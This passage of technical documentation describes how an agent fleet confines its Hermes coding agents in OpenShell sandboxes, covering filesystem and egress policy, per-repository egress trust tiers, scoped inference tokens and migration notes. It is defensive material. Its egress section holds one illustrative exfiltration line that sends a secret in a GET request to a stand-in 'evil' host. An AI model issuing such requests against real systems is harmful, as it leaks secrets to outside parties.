# Running Hermes under the OpenShell sandbox

This describes the confined Linux execution path. Code tasks and their
independent verification run inside policy-governed OpenShell sandboxes.
Conversational gateway services are a separate deployment concern: the selected
Hermes service can run natively with its preserved profile. The macOS hub runs
native control and service clients and delegates repository verification to
Linux; installing OpenShell on macOS is not the supported recovery path.

## Why

The executor already launches Hermes with `--yolo` (Hermes' own approval prompts
bypassed — see `_hermes_argv` in `src/mac/task_executor.py`). On its own that is
**unguarded**. Wrapping the process in OpenShell makes YOLO *safe* by enforcing
every guardrail from a declarative policy:

| Concern | Enforced by | How |
| --- | --- | --- |
| Filesystem | OpenShell Landlock | allow-list of read-only / read-write paths |
| Syscalls / privilege | OpenShell seccomp | syscall filter; never runs as root |
| Network egress | OpenShell L7 proxy | **deny-by-default**; per-host/per-binary rules |

One guardrail system (the OpenShell policy YAML), not two.

## What this adds

The production path is `mac-openshell-supervisor`. It starts a named sandbox
for the agent, passes the MAC-assigned policy, disables unsandboxed YOLO, and
runs `mac-hermes-gateway` or the configured child process inside the sandbox.
The legacy `_maybe_wrap_openshell()` task-executor seam and
`MAC_OPENSHELL_GATEWAY` gateway re-exec path remain as compatibility knobs.

**A policy is always passed — enabling can never silently fall back to
OpenShell's image-default profile.** `_resolve_openshell_policy()` resolves `<P>`
in this order, and raises if none is found (fail closed). A MAC-managed policy
assigned to the agent should be materialized to `MAC_OPENSHELL_POLICY` by
deployment; that wins over file fallback.

1. `MAC_OPENSHELL_POLICY` (explicit) — must exist, else error.
2. `~/.mac/openshell-policy.yaml` — the operator-filled fleet policy.
3. the bundled fail-closed default `src/mac/openshell/default-policy.yaml`.

The **bundled default is a lockdown**: filesystem-confined, never root,
`landlock: hard_requirement`, and **all network egress denied** (empty
`network_policies`). Under it the agent can't reach the hub/gateway, so an
unconfigured deployment fails closed rather than running under an unknown
profile. For real use, copy the **operator template**
`deploy/openshell/mac-hermes-policy.yaml` (which allows the hub, model gateway,
and GitHub, and also defaults to `landlock: hard_requirement`), fill in the
`__PLACEHOLDER__` hosts, and install it at `~/.mac/openshell-policy.yaml` or
point `MAC_OPENSHELL_POLICY` at it.

OpenShell OCSF/event output is normalized by `mac-openshell-collector` into
`mac.action_event.v1` records and posted to `/action-events`. The legacy
`/events`, `/command-audit`, and `/observability` surfaces remain readable;
the action ledger is the canonical normalized stream and can export an
OTLP-compatible shape through `/action-events/export/otlp`.

## Containment posture by platform

The fleet is not uniformly sandboxed, and that is a decision rather than a gap
to be fixed. Recorded here because it has been asked more than once, and
because the answer determines what other layers are allowed to stop checking.

| platform | posture | what confines the agent |
| --- | --- | --- |
| Linux | OpenShell managed runtime | Landlock filesystem confinement, an allowed-command set, and a per-binary egress proxy. Fails closed: if the kernel cannot enforce Landlock the executor refuses to run. |
| macOS | `macos_host` (ADR 0015) | Host OS protections — SIP, TCC, Gatekeeper. No local OpenShell runtime; a verifier CLI/tunnel may connect to a Linux gateway. `MAC_OPENSHELL_SANDBOX` on darwin is a misconfiguration, not a posture to waive. |

**Accepted, 2026-08-19.** macOS nodes run the agent as a plain host
application and this is fine for the fleet's threat model: macOS applications
carry their own OS-level protections, and the darwin nodes are operator
machines rather than untrusted multi-tenant workers.

For remote verification, `deploy/openshell/install-certifier-gateway-tunnel.sh`
checks its explicit loopback endpoint with a bounded, read-only
`sandbox list --limit 1 --names` RPC and confirms that the launchd tunnel job
is still loaded. An empty sandbox list is healthy. OpenShell 0.0.72 `status`
can exit successfully after displaying a connection error, so its exit code
alone is insufficient. A failed readiness check restores the prior launchd
generation. This proves tunnel and control-API readiness; sandbox execution
and completion still require their own verification.

Be precise about what that does and does not mean, so nobody over-reads it.
macOS App Sandbox applies to *entitled application bundles*; a launchd-run
Python process is not in one. SIP and TCC protect system locations and
privacy-sensitive resources — they do not restrict which commands the agent
may run inside the user's own account, nor which endpoints it may reach.
That is a real difference from Landlock plus the egress proxy on Linux.

The consequence that matters: this is the layer that made it correct to delete
the pre-OpenShell execution-key filter from the message channel (`command`,
`exec`, `script`, `shell` as forbidden payload KEYS). That filter inspected the
spelling of a key on a path where nothing executes payloads, so it protected
nothing on either platform while making the real boundary harder to see. Do not
re-add it. If darwin confinement needs strengthening, strengthen it here — a
`sandbox-exec` profile or a hardened launchd job — not by filtering data
elsewhere in the system.

## Verifier resources

Verifiers run repository code on the configured Linux OpenShell gateway.
A macOS host may own the CLI/tunnel connection, but does not host that runtime.
The same verifier execution path serves the worker's pre-push verification
(whose result is the review verdict) and projected-merge publication checks.

`MAC_HUB_VERIFY_PROFILE` is an opt-in setting on each hub and Linux OpenShell
worker process. Unset, empty,
or `default` retains the driver's existing behavior. `bounded-tmpfs` requests
12 CPUs, 32 GiB memory and an 8 GiB Docker-driver tmpfs at
`/tmp/mac-test-storage`, with `MAC_TEST_PG_DATADIR` pointing to its
`mac-test-pgdata` subdirectory and `MAC_TEST_JOBS=8`. Repository fixture scratch
uses `TMPDIR=/sandbox/test-scratch` on the sandbox filesystem, so large fixture
copies cannot fill PostgreSQL's mount. The tmpfs uses mode 1777 and does not
expose a host directory. PostgreSQL keeps its normal durability settings.
The mount is outside `/sandbox` because OpenShell 0.1 reserves the image's
working directory and everything under it; `/tmp` is writable under every MAC
sandbox policy. OpenShell 0.1 also refuses caller driver JSON unless the
gateway enables `allow_driver_config`, which `bootstrap-openshell.sh` renders
with resource admission on and bind mounts off.

Before extracting or bootstrapping the repository, the sandbox proves that it
is on Linux and that the requested path is a writable tmpfs. A missing proof,
unknown profile or unsupported backend cannot produce a passing verification.
No arbitrary driver JSON, host mounts or shell arguments are accepted through
this setting. It changes resources, not test selection, coverage, signing or
the isolation policy.

Worker sandboxes request the same limits at creation. Every fresh verification
shell reapplies the storage preflight and environment before toolchain setup;
settings in the agent's shell are not inherited. Separate read-only verifier
sandboxes use this profile without widening their create-argument allowlist.
With the profile enabled, explicit worker `--cpu`, `--memory` or
`--driver-config-json` overrides are rejected instead of passing duplicate flags.

Enable the profile only on a qualified Linux gateway through the supported
hub/worker configuration and deployment path. It affects future sandboxes; do not restart
active verifiers to change their storage. Source publication alone does not
prove activation: inspect the next independent sandbox's limits and mount,
then observe its required tests and normal publication completing. Keep
failed-run evidence when diagnosing resource exhaustion or unsupported drivers.

## Prerequisites

MAC/OpenShell uses one container runtime: **Docker Engine/Moby through
OpenShell's Docker driver**. This is the production contract for bare metal,
VMs, and containerized environments that support nested Docker/DinD. Do not use
Docker Desktop, Podman, or `podman-docker` for fleet nodes; those create
different image stores, gateway configs, GPU behavior, and failure modes.

On Linux hosts, OpenShell's kernel primitives run natively (kernel ≥ 5.13 for
Landlock). On non-Linux developer machines, run a Linux VM/container with OSS
Docker Engine/Moby and validate there; the production architecture does not
depend on Docker Desktop licensing or behavior.

OpenShell 0.0.62 had a runtime-driver mismatch on some Linux hosts: the gateway
could be configured with only `[openshell.drivers.docker]` while still logging
`openshell_driver_podman` and reading the sandbox image from the user's Podman
image store. This mismatch is resolved in OpenShell 0.0.72 (the current fleet
pin). `bootstrap-openshell.sh` retains the `mirror_image_for_openshell_runtime`
step as belt-and-suspenders, and still runs an `openshell sandbox create` smoke
test that verifies `gh` and `opencode` are visible. Bootstrap then
runs `live-confinement-probe.sh` inside a second throwaway sandbox and fails
closed unless the runtime proves the expected filesystem, egress, privilege,
seccomp, user-namespace, and raw-socket boundaries.

```console
deploy/openshell/bootstrap-openshell.sh --enable --fail-closed
docker info             # must be a real Docker Engine/Moby daemon, not Podman
openshell gateway list  # gateway must be reachable
```

After host validation, reconcile the hub's OpenShell ledger. Bootstrap success
does not by itself prove the hub knows the agent is required, which policy is
assigned, or whether the runtime is currently deployed. The reconciliation
command reads the enabled Linux agents from `~/.mac/fleets.yaml` unless
`--agent` is passed explicitly, defaults to dry-run, and preserves existing
agent resources while setting only `resources.openshell_required`.

```console
mac admin openshell reconcile --target-fleet <fleet>
mac admin openshell reconcile --target-fleet <fleet> --apply --validated \
  --sandbox-id docker-openshell-smoke-$(date +%Y%m%d) \
  --validation-summary "Docker image smoke and OpenShell sandbox smoke passed"
mac admin openshell status --agent agent_hub
```

`--validated` is required when applying `status=active`; failed or degraded
hosts should still be reconciled as required, but reported with
`--status failed` or `--status degraded` so `effective.fail_closed` remains
truthful.

## Enable

```console
cp deploy/openshell/mac-hermes-policy.yaml /etc/mac/openshell-policy.yaml
$EDITOR /etc/mac/openshell-policy.yaml      # fill in __PLACEHOLDER__ tokens

export MAC_OPENSHELL_POLICY=/etc/mac/openshell-policy.yaml
export MAC_ALLOW_UNSANDBOXED_YOLO=0
mac-openshell-supervisor --agent-id agent_hub --policy "$MAC_OPENSHELL_POLICY" -- mac-hermes-gateway
```

### Environment knobs

| Variable | Default | Meaning |
| --- | --- | --- |
| `MAC_OPENSHELL_REQUIRED` | derived from `agent.resources.openshell_required` | fail closed when OpenShell/policy is unavailable |
| `MAC_OPENSHELL_BIN` | `openshell` | path to the `openshell` binary |
| `MAC_OPENSHELL_POLICY` | _(resolved)_ | explicit policy path; MAC-managed materialized policy should be set here |
| `MAC_OPENSHELL_EVENTS_FILE` | _(none)_ | JSONL/OCSF event stream for `mac-openshell-collector` |
| `MAC_ALLOW_UNSANDBOXED_YOLO` | `0` on required agents | explicit hatch for non-required hosts |
| `MAC_OPENSHELL_SANDBOX` | _(off)_ | deprecated compatibility: one-shot task executor wrapping |
| `MAC_OPENSHELL_SANDBOX_NAME` | _(ephemeral)_ | fixed sandbox name (debug only) |
| `MAC_OPENSHELL_KEEP` | _(off)_ | truthy → `--keep` (don't tear down; debug) |
| `MAC_OPENSHELL_GC` | set to `1` by bootstrap | reconcile old orphaned MAC-owned sandboxes before new executor or hub-verification work |
| `MAC_OPENSHELL_STALE_AFTER_SECONDS` | `86400` | minimum age for automatic sandbox garbage collection |
| `MAC_OPENSHELL_CREATE_ARGS` | _(none)_ | extra `sandbox create` args (shell-split), e.g. `--from img`, `--upload /src:/src`. On a worker with a managed image, `--from` must match `runtime-image-ref` (below) |
| `MAC_OPENSHELL_RUNTIME_IMAGE_REF_FILE` | `~/.mac/openshell/runtime-image-ref` | the worker's one sandbox-image pin; coding sandboxes and the repository test gate both run this image |
| `MAC_HUB_VERIFY_IMAGE` | _(none)_ | test-gate image for a host with no managed pin, such as the hub; ignored where `runtime-image-ref` exists |
| `MAC_OPENSHELL_ENV_PASSTHROUGH` | hub+gateway vars | comma list of env names forwarded through the private sandbox environment file |
| `MAC_OPENSHELL_TASK_EGRESS` | _(off)_ | render per-repo egress into each task's policy (ADR 0009 §2a; see below) |
| `MAC_OPENSHELL_POLICY_SYNC` | `1` | worker pulls its hub-assigned policy between tasks (see below) |

## One sandbox-image pin

A worker pins its sandbox image once, in `~/.mac/openshell/runtime-image-ref`.
`bootstrap-openshell.sh` and `python -m mac.openshell_image_pin` write it.
Coding sandboxes use `MAC_OPENSHELL_CREATE_ARGS --from`, which is derived from
the pin. The repository test gate reads the pin directly. If `--from` and the
pin disagree, the worker refuses to pick one: the gate reports
`OpenShell runtime image pins disagree`, and the fix is
`python -m mac.openshell_image_pin`.

Before this, the gate had its own pin, `MAC_HUB_VERIFY_IMAGE`. A repin on
2026-10-02 missed it, so for a day every gate ran an older image than the coding
agent (task_b1828d67). `scripts/fleet-update` re-derives `mac.env` from the pin
on every worker update, and `--runtime-image REF --runtime-input-sha256 SHA`
repins the whole fleet to one published image.

The image keeps no runtime `ENV` for tool settings. OpenShell 0.0.x does not
pass image `ENV` to sandbox processes, while 0.1.x does. So npm's limits live
in `/usr/local/etc/npmrc` (a link to `/etc/npmrc`), uv's in `/etc/uv/uv.toml`,
and pnpm's in its `/usr/local/bin` wrappers. Each is smoke-tested under `env -i`
at build time, so both OpenShell releases see the same settings.
`UV_PROJECT_ENVIRONMENT` and `VIRTUAL_ENV` are build-only. Under 0.1.x they
would point a repository's own `uv sync` or `uv pip` at the root-owned
`/opt/mac-venv`.

## Policy delivery: the hub assignment reaches the worker

`mac admin openshell policy assign <policy> <agent>` used to record intent only. The
executor resolved its policy from `MAC_OPENSHELL_POLICY`,
`~/.mac/openshell-policy.yaml`, or the bundled fail-closed default — and
`~/.mac/openshell-policy.yaml` was written once at provision time by
`bootstrap-openshell.sh`. A reassignment therefore reached a running worker only
via a re-bootstrap.

The worker now converges on its assignment. Between tasks (never mid-task — the
executor reads the policy when it creates a sandbox) it pulls
`GET /agents/{id}/openshell/policy`, and if the checksum differs from what is on
disk it installs the text at `~/.mac/openshell-policy.yaml` via write-then-rename
at mode `0600`, then reports convergence so `mac admin openshell policy deploy-status`
reflects the host rather than the intent.

Deliberate properties:

- **Self-only.** The route carries the `agent` scope, not the generic `read` a
  GET would otherwise get, and binds the path agent to the token principal — the
  same treatment as `/agents/{id}/directives/effective`. A policy names the
  fleet's hub/gateway hosts and the binaries allowed to reach them.
- **`MAC_OPENSHELL_POLICY` still wins.** An explicit operator override is never
  overwritten; silently replacing the file it points at would make the override a
  lie.
- **Fail-safe, not fail-open.** An unreachable hub, a missing assignment, or a
  malformed response leaves the existing policy in place. Confinement is never
  dropped because delivery failed.

### Assignment scope and precedence

An assignment targets an **agent** or a **fleet**. Resolution is explicit:

1. An agent-scoped assignment wins over any fleet-scoped one. The more specific
   target is the more deliberate one, so pinning a single agent overrides the
   fleet default without editing the fleet.
2. Otherwise a fleet-scoped assignment applies to the fleet's *configured*
   members (`fleet_agents`). Runtime observations do not count: an agent must
   not be able to observe itself into someone else's policy.
3. An agent in several fleets whose assignments name different policies is a
   misconfiguration, and resolution fails loud rather than picking whichever
   row sorts first. Fleets naming the same policy and version agree, so those
   resolve normally. Pinning the agent directly resolves a conflict.
4. When an assignment is superseded, deactivated, or the agent leaves the
   fleet, resolution falls through to the next matching rule — possibly to no
   hub policy at all, which leaves the worker's existing policy in place
   (fail-safe, as above).

`--target-type host` is **refused**. Nothing resolves a host to the agents
running on it (`machines.hostname` is not unique), so a host assignment could
only ever be a row nobody enforces; on a confinement boundary an unenforceable
assignment that lists as "assigned" is worse than no assignment at all.

### Who can read a policy

The guardrail text names the fleet's hub and gateway hosts, their ports, and the
binaries permitted to reach them — a map of the control plane. Every *write* on a
policy already required the global fleet principal, so `policy_text` is privileged
on the read side to match:

| Surface | Scope | Carries `policy_text`? |
| --- | --- | --- |
| `GET /openshell/policies/{id}`, `.../versions`, `POST .../render` | `admin` | yes |
| `GET /agents/{id}/openshell/policy` | `agent`, self-only | yes (its own) |
| `GET /openshell/policies`, `.../assignments`, `/agents/{id}/openshell/status`, `/dashboard/state` | `read` | **no** — identity, version and checksum only |

`OpenShellPolicy.to_dict()` and `OpenShellPolicyVersion.to_dict()` omit the text
**by default**; callers needing it pass `include_text=True`. The default is the
control, not per-route filtering: every route that serialized a policy leaked the
body by accident — `/dashboard/state`, which embeds the whole corpus, included —
and a new route would have inherited the same leak. `render` is admin-gated too,
because a rendered policy is the template with the placeholders filled *in*.

`checksum` is retained everywhere, so drift detection and the worker's
skip-if-converged check never need the body.

## Per-repo egress (ADR 0009 §2a)

Deny-by-default egress is right for an unknown repo, but a real repository has to
reach its package registry. Before this landed the only way to allow that was to
declare the hosts **fleet-wide** in the operator template, so every sandbox in
the fleet carried the union of every repo's egress.

With `MAC_OPENSHELL_TASK_EGRESS=1`, the executor widens *that task's* policy from
the environment contract the worker derived for the repository, and only that
task's. The base policy is **appended to, never rewritten**, so expansion cannot
relax a filesystem rule, the Landlock posture, or `run_as_user`.

### Two trust tiers, because derivation is untrusted

`derive_environment_contract` reads `.npmrc` and lockfile resolution URLs from
the repository **working tree**, which anyone who can open a pull request
controls. Derivation is therefore a *proposal*, never a grant
(`src/mac/sandbox_egress.py`):

| Tier | Source | Granted when |
| --- | --- | --- |
| `derived_trusted_registry` | repo working tree | the host exactly matches the reviewed `TRUSTED_REGISTRY_HOSTS` allowlist |
| `hub_declared` | task `metadata.egress_contract.hosts` | the host is well-formed |

A lockfile naming `evil.example` is refused and reported as a contract gap, not
granted. The declared tier reads **top-level** task metadata on purpose:
`metadata.runtime` is worker-written and so carries only repo trust, whereas
top-level task metadata was set through an authenticated hub credential.

Every grant is `access: read-only` and host-scoped — host-allowlisting is the
axis, because `GET https://evil/?x=<secret>` is exfiltration with a GET.

### Operating it

- Off by default: a repo must not be able to widen its own sandbox by adding a
  lockfile entry, so enabling this is an operator act.
- Every decision emits a `sandbox_egress_decision` telemetry event carrying
  grants **and** refusals. A denied fetch is otherwise diagnosed as a flaky
  network several runs later.
- Read-only repository reports never expand: they attest the `policy_sha256`
  they ran under, and a per-task policy would invalidate that attestation.
- A fleet with a private registry overrides the allowlist rather than
  weakening it: pass `trusted_registries` to `classify_egress_hosts`.
- The **bundled fail-closed default is never expanded.** It ends
  `network_policies: {}`, and widening it would turn "unconfigured deployment
  fails closed" into "unconfigured deployment has egress". Expansion requires a
  base policy that already declares a non-empty `network_policies` block — i.e.
  a real operator policy.
- If rendering fails for any reason the task runs on the base policy, so it
  fails the way it did before the feature existed (a denied fetch) rather than
  failing open or losing the run.

## Verify (requires Docker Engine/Moby + OpenShell installed)

1. `docker info` succeeds and `docker --version` is not a Podman compatibility
   shim.
2. `openshell gateway list` shows the selected gateway.
3. `~/.mac/openshell/live-confinement-probe.log` ends with
   `CONFINEMENT_PROBE_OK`; bootstrap will not enable enforcement without it.
4. Inspect orphan cleanup before applying it manually:
   ```console
   mac admin openshell sandbox-gc
   mac admin openshell sandbox-gc --apply
   ```
   The default 24-hour grace period protects recent work. New sandboxes are
   labeled with their MAC owner, lifecycle kind, creator PID, and debug-keep
   status; a live creator or `mac.keep=true` is never collected. Exact legacy
   `mac-task-*` and `mac-hubverify-*` names remain eligible after the grace
   period so pre-label leaks can be retired.
5. Dry-run the wrap without spawning:
   ```python
   import os

   os.environ["MAC_OPENSHELL_SANDBOX"] = "1"
   os.environ["MAC_OPENSHELL_POLICY"] = "/etc/mac/openshell-policy.yaml"
   from mac import task_executor as te

   print(te._maybe_wrap_openshell(te._hermes_argv("hello")))
   ```
   Confirm it begins with `openshell sandbox create … --policy … --` and ends
   with the Hermes argv.
6. Start `mac-openshell-supervisor` on hub, worker-1, and worker-2. Confirm
   the gateway, task executor, finalizers, and Hermes sessions inherit the same
   sandbox id.
7. Trigger an off-policy filesystem or network attempt. Confirm the denial
   appears in OpenShell logs, `/action-events`, the dashboard Observability
   action feed, memory summary eligibility, and OTLP export.

## The coding CLI in the sandbox

### The fleet's ordered CLI list

Which coding CLIs the fleet runs is hub configuration: `MAC_CODING_AGENTS` on the
hub, an ordered comma list (known CLIs: `opencode`, `claude`; default
`opencode`). Workers inherit it. The hub projects its list, and its
`MAC_CLAUDE_MODEL` and `MAC_JUDGE_MODEL` when set, into every assignment as
`metadata.runtime.coding_policy` (a task cannot carry its own), and returns the
same document as `coding_policy` on every heartbeat. A worker reads its own
`MAC_CODING_AGENTS` only if the hub has issued none, and reports that as a local
override.

For each task the executor runs the first CLI on the list that works on that
host, and moves to the next only on a structured route failure:

| Failure class | When | Detected by |
| --- | --- | --- |
| `agent_binary_missing` | the CLI is not on the execution PATH | detector, before the run |
| `not_configured` | no hub URL to route through | detector, before the run |
| `inference_token_unavailable` | no worker or inference token | detector, before the run |
| `preflight_failed` | the in-sandbox preflight did not echo the sentinel | preflight, before the run |
| `route_auth_failed` | the run failed and the hub router's last call on that CLI's route got 401/403 | the task's `llm.route` records |
| `route_rate_limited` | the same, with 429 | the task's `llm.route` records |
| `route_upstream_unavailable` | the same, with a 5xx or an unreachable upstream (502) | the task's `llm.route` records |

The route records are the hub router's own per-request `llm.route` entries
(`/v1/chat/completions` for opencode, `/v1/messages` for Claude Code); no
transcript is read. A failing test, a judge's `not_met` or a bad diff is the
task's outcome and never moves the list. Each CLI runs at most once per attempt,
and the next one continues in the same workspace. The task board shows each skip
and failover as a hub `status` message, and the evidence manifest records the
order and every run under `coding_agents`.

Inside one route, provider failover is the hub router's job, across the providers
in `MAC_ROUTER_PROVIDERS`.

### opencode through the hub model router

opencode gets its model from the hub's OpenAI-compatible router
(`$MAC_HUB_URL/v1`). Claude Code uses the router's Anthropic-shaped
`/v1/messages` with the same per-task token.

The worker token never enters the sandbox: it can claim tasks and write the
ledger. Instead, for each task:

1. The executor, on the host, calls `POST /agents/{agent_id}/inference-tokens`
   with the worker token. The hub returns a token bound to that agent with only
   the `inference` scope. It lives 6 hours and is revoked when the task ends.
   The hub keeps only its sha256 hash, in `inference_tokens`.
2. The sandbox receives it as `MAC_INFERENCE_TOKEN`, with `MAC_HUB_URL` as the
   sandbox sees it (a loopback hub becomes `host.openshell.internal`).
3. The executor writes `.mac-opencode.json` into the uploaded workspace and
   points `OPENCODE_CONFIG` at it. Its only provider is `machub`:

   ```json
   {
     "model": "machub/gpt-5.6-sol",
     "autoupdate": false,
     "provider": {
       "machub": {
         "npm": "@ai-sdk/openai-compatible",
         "options": {
           "baseURL": "http://<hub>:<port>/v1",
           "apiKey": "{env:MAC_INFERENCE_TOKEN}",
           "headers": {"X-MAC-Task-ID": "<task id>"}
         },
         "models": {"gpt-5.6-sol": {"tool_call": true}}
       }
     }
   }
   ```

4. opencode runs as `opencode run --auto --model machub/<model>`. The model is
   `MAC_TASK_MODEL`, else `MAC_CODING_DEFAULT_MODEL`, else `gpt-5.6-sol`.
   `MAC_CODING_MODELS` lists the models the config declares.

An `inference` token may call `POST /v1/chat/completions` and
`POST /v1/embeddings` and gets 403 everywhere else. The router attributes each
call to the token's agent. Agent credentials keep reaching all of `/v1`. The
policy's `opencode_router` block holds the opencode binaries to the same two
routes on the hub host and port.

The in-sandbox preflight mints a 15-minute token of its own and revokes it
after the probe. Each logical model name must be one the hub's
`MAC_ROUTER_PROVIDERS` aliases for every provider in its failover order.

### The in-sandbox route proof

**Working outside the sandbox is not sufficient to enable the coding CLI.** When
OpenShell confinement is in effect (the per-task wrap *or* the supervisor — i.e.
`MAC_OPENSHELL_REQUIRED` truthy / the agent is required), the route is **gated
on a real in-sandbox preflight**: a throwaway sandbox runs opencode under the
live policy with a short-lived inference token and must echo a sentinel back,
proving end to end that the **binary exists, the token is accepted, and egress
to the hub router is permitted** in the sandbox.

The worker runs this probe for every CLI on the list before dispatch and
publishes a secret-free `mac.coding_clis.v2` heartbeat record with one entry
per listed CLI (and the list itself under `order`): provider,
wire protocol, endpoint, authentication kind/source, model, route fingerprint,
and the matching `mac.coding_agent.verification.v1` result. Repository dispatch
to an OpenShell agent requires a fresh successful proof for at least one CLI
on the hub's list. A
task-pinned model also requires proof for that exact model. Presence of the
binary and a hub credential is only `configured`; it is never `verified`.

A failed probe carries a `failure_class` in that
`mac.coding_agent.verification.v1` record. It is derived from the exit status
and from structured JSON error objects only; free-text output is never
searched, because matching words in a transcript misclassifies runs (a sandbox
named `mac-task-429907755059` was once classed as rate limited).

| `failure_class` | Source | Meaning |
| --- | --- | --- |
| `timeout` | exit 124 or 137 | The probe ran past `MAC_CODING_AGENT_PREFLIGHT_TIMEOUT`. |
| `agent_binary_missing` | exit 126 or 127 | `opencode` is not runnable on the image PATH. |
| `sandbox_policy_denied` | `{"error": "policy_denied", ...}` | The OpenShell egress policy refused the destination. The credential is untouched. |
| `authentication_failed` | JSON error code `invalid_api_key`/`unauthorized`, or status 401/403 | The hub rejected the inference token. |
| `rate_limited` | JSON error code `rate_limit_exceeded`/`rate_limit_error`, or status 429 | The router throttled the probe. |
| `provider_server_error` | JSON error status 5xx | The router or its provider failed the call. |
| `inference_token_unavailable` | — | The worker could not mint the probe's token. |
| `sentinel_missing` | exit 0 | opencode ran but did not echo the sentinel. |
| `probe_failed` | anything else | Read the probe output. |

A policy denial or an authentication failure proves opencode launched and
opened a socket, so its `binary_status` is `present`.

The executor repeats the same fail-closed check after claim. If the selected
CLI fails and the progress observer proves that the sandbox is clean and has no
evidence manifest, repository bootstrap, tests, and publication are skipped;
harvest and teardown still run. This makes an unavailable route terminate
promptly without disguising it as a long finalizer stall.

The unattended finalizer auto-commits modified tracked files but deliberately
refuses untracked or staged-new files. A coding agent must commit its own new
files before finishing. If an otherwise successful executor run is preserved
with passing contract-test evidence but is refused only at this
boundary, inspect it without mutation first:

```console
mac task recover-finalizer /path/to/task-workspace --json
```

Recovery is explicit and allow-listed. Repeat `--approve-new-file PATH` for
every intended new path, provide the original executor `--evidence-id`, and add
`--execute`. MAC validates the preserved HEAD and evidence, commits with
provenance, rebases, reruns both gates, and uses the shared guarded push. It
never invokes the executor/model again and does not weaken ordinary unattended
finalization.

Preserved test evidence is judged on gate semantics, not argv spelling. The
contract command counts, and so does the repository's own sanity wrapper
(`scripts/run-sanity-tests.sh --base <prepared base sha>`) that the executor
sandbox uses to scope the same gate — but only when the wrapper is committed in
the preserved HEAD, its `--base` names this task's prepared base, it carries no
argument outside `--base`/`--changed-file`, and it passed. Anything else (an
arbitrary command, a stale or missing base, a nonzero result) is still refused,
and the accepted item is echoed as `preserved_test_evidence` in the plan.
Whichever spelling was preserved, recovery reruns the full contract command
itself after rebasing onto canonical.

A separate failure mode is a finalizer that harvested verified work but was
itself interrupted — a timeout, cancellation, or crash after the contract-test
and verification gates passed but before the guarded push confirmed a remote ref.
The interrupted run leaves a partial `mac-evidence.json` (with a
`finalizer_interrupted` marker) and a `finalizer-progress.json` stuck in a
non-terminal status. Resume it the same way:

```console
mac task recover-stalled-finalizer /path/to/task-workspace --json
```

Add `--approve-new-file PATH` only for any new files the stalled finalizer left
uncommitted, provide the original `--evidence-id`, and add `--execute`. MAC
revalidates the preserved HEAD, commits any pending work with stalled-finalizer
provenance, rebases, reruns both gates, and performs the shared guarded push.

For opencode to pass the preflight, the deployment must ensure, **inside the
sandbox**:

1. **Binary present** — the standard MAC image installs `opencode` and gates the
   build on `command -v opencode`.
2. **A hub credential on the host** — the worker needs `MAC_HUB_URL` and its
   worker token to mint the inference token. No provider credential or
   opencode `auth.json` is copied into the sandbox.
3. **Baseline repo tools present** — the MAC OpenShell image installs `git`
   and `gh`; custom images must provide the same baseline if they
   are used for repository work.
4. **Egress allowed** — the OpenShell policy's `network_policies` must permit the
   hub (`mac_hub`, and `opencode_router` for the two inference routes), the git
   host, and Python package index hosts used by repository bootstrap
   (`pypi.org` and `files.pythonhosted.org` in the standard policy). The bundled
   fail-closed default denies all egress, so the preflight fails closed there by
   design.

### Environment knobs

| Variable | Default | Meaning |
| --- | --- | --- |
| `MAC_PREFER_CODING_AGENT` | `1` | master switch; `0` disables the coding route and the executor fails closed |
| `MAC_CODING_AGENTS` | `opencode` | hub setting: the fleet's ordered coding-CLI list (`opencode`, `claude`), inherited by workers |
| `MAC_CLAUDE_MODEL` | `claude-opus-4-8` | hub setting, inherited: the model Claude Code runs on |
| `MAC_JUDGE_MODEL` | `claude-opus-4-8` | hub setting, inherited: the independent judge's model |
| `MAC_CODING_AGENT` | _(unset)_ | deprecated; `off` still disables the coding route |
| `MAC_CODING_AGENT_SANDBOX` | `verify` | `verify` = gate on the in-sandbox preflight; `trust` = assume the image is provisioned (skip the probe); `off` = never use a coding agent when confined |
| `MAC_CODING_AGENT_PREFLIGHT_TIMEOUT` | `180` | seconds for the in-sandbox preflight |
| `MAC_CODING_AGENT_PREFLIGHT_TTL_SECONDS` | `900` | successful route-proof lifetime in the executor/worker process |
| `MAC_CODING_AGENT_PREFLIGHT_FAILURE_TTL_SECONDS` | `60` | retry interval for a failed route proof |
| `MAC_WORKER_CODING_ROUTE_PROBE_INTERVAL_SECONDS` | success `900`, failure `60` | worker heartbeat probe cadence |
| `MAC_CODING_ROUTE_MAX_AGE_SECONDS` | `1200` | maximum proof age accepted by dispatch |
| `MAC_OPENSHELL_REPO_REQUIRES_CODING_AGENT` | `1` in fleet deploy | executor strict mode: repository tasks fail closed unless a coding CLI is verified in-sandbox |
| `MAC_CODING_MODELS` | `gpt-5.6-sol` | logical models the generated opencode config declares |
| `MAC_CODING_DEFAULT_MODEL` | `gpt-5.6-sol` | model opencode runs on when the task does not pin one |

Set `MAC_CODING_AGENT_SANDBOX=trust` only after validating the image+policy out
of band; it skips the per-task proof. `python -m mac.coding_agent` prints the
(secret-free) host-side routing decision for the current environment.

## OpenShell version notes

### OpenShell 0.1.2 migration — canary 2026-10-03

The fleet pin is OpenShell 0.1.2 (reviewed-cli-assets.sh, bootstrap-openshell.sh,
openshell_reconcile.py, cli.py). A worker canary confirmed that image ENV
reaches sandbox processes, confinement and network policy behave, and the MAC
policy parses unchanged. What changed for MAC:

- `sandbox create --upload X -- <command>` is rejected, and a trailing create
  command becomes the sandbox's main process: when it exits the sandbox leaves
  Ready and every later `exec` fails. Every MAC flow therefore creates with its
  uploads and no command, kept alive (`--detach` on 0.1; a bounded `/bin/true`
  on 0.0.x, chosen from `openshell --version`), then runs its work with
  `sandbox exec` and deletes the sandbox (`mac.openshell_runtime`).
- gateway.toml is schema v2: `version = 2`, scalar `compute_driver`,
  `image_pull_policy = "if_not_present"`, no Docker `network_name`, and no
  `grpc_endpoint` override (supervisors are host-networked; the old
  `host.openshell.internal` endpoint broke startup). Bootstrap runs
  `openshell-gateway config preflight --path` before installing it, and pins
  the gateway's `DOCKER_HOST` to `/var/run/docker.sock`.
- The supervisor is a separate host-networked container from a pinned image
  digest, not a static binary.
- 0.0.x and 0.1 peers cannot mix and the gateway migrates its DB in place.
  Bootstrap retires every sandbox, backs up both CLIs, the gateway, gateway.toml
  and `~/.local/state/openshell/gateway/openshell.db*` under
  `~/.mac/openshell/upgrade-backups/`, and `bootstrap-openshell.sh --rollback
  [DIR]` restores that set.

### OpenShell 0.0.72 compatibility — validated 2026-07-04

OpenShell 0.0.72 has been validated against all three MAC sandbox surfaces
(executor sandbox create, verifier tar-upload verify, gateway confinement).
The fleet pin was advanced from 0.0.62 to 0.0.72 in bootstrap-openshell.sh,
